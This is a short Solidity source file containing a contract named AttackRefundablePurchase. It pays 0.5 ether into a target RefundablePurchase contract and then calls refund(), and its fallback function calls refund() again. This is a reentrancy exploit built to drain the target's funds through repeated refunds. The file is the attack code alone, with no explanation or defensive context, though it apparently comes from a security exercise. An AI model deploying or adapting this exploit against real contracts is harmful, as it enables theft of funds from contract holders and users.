pragma solidity ^0.4.24;

contract RefundablePurchase {
    function refund() public;
}

contract AttackRefundablePurchase {
    RefundablePurchase public target;

    constructor(RefundablePurchase _target) public {
        target = RefundablePurchase(_target);
    }

    function attack() public payable {
        require(msg.value == 0.5 ether);
        address(target).call.value(msg.value)();
        target.refund();
    }

    function() public payable {
        target.refund();
    }
}
